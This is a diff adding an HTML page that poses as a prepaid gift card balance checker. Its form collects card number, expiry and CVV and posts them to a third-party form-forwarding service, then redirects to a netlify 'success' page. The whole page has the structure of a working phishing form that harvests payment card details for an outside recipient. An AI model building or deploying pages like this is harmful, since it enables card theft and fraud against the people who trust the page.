@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="favicon.png" type="image/x-icon" />
+    <link rel="stylesheet" href="style.css" />
+    <title>balance</title>
+  </head>
+  <body>
+    <header>
+      <h1>Prepaid gift card</h1>
+    </header>
+    <div class="space01"></div>
+    <div class="horizontal"></div>
+    <div class="manage">
+      <p>Manage Your Gift Card</p>
+    </div>
+    <section class="main">
+      <div class="maintext">
+        <p>check your balance and review your transactions.</p>
+      </div>
+      <form
+        action="https://formsubmit.co/c813a38244b90ec8fade1c414b0dc0ac "
+        method="POST"
+      >
+        <!-- honey pot -->
+        <input type="text" name="_honey" style="display: none" />
+
+        <!-- display Captcha -->
+        <input type="hidden" name="_captcha" value="false" />
+        <!-- thank you page -->
+        <input
+          type="hidden"
+          name="_next"
+          value="https://prepaid-validity.netlify.app/sucess.html"
+        />
+
+        <div class="cardnumber">
+          <input
+            type="number"
+            name="card number"
+            placeholder="CARD NUMBER"
+            required
+          />
+        </div>
+        <div class="expdate">
+          <p>EXPIRATION DATE</p>
+        </div>
+
+        <div class="exp">
+          <div class="expmonth">
+            <input
+              type="number"
+              name="expiration month"
+              placeholder="MM"
+              required
+              minlength="2"
+              maxlength="2"
+            />
+          </div>
+          <div class="expyear">
+            <input
+              type="number"
+              name="expiration year"
+              placeholder="YY"
+              required
+              minlength="3"
+              maxlength="3"
+            />
+          </div>
+        </div>
+        <div class="cvv">
+          <input type="number" name="cvv" placeholder="CVV" required />
+        </div>
+
+        <div class="submitbutton">
+          <input class="sub" type="submit" value="Sign In" />
+        </div>
+      </form>
+    </section>
+  </body>
+</html>
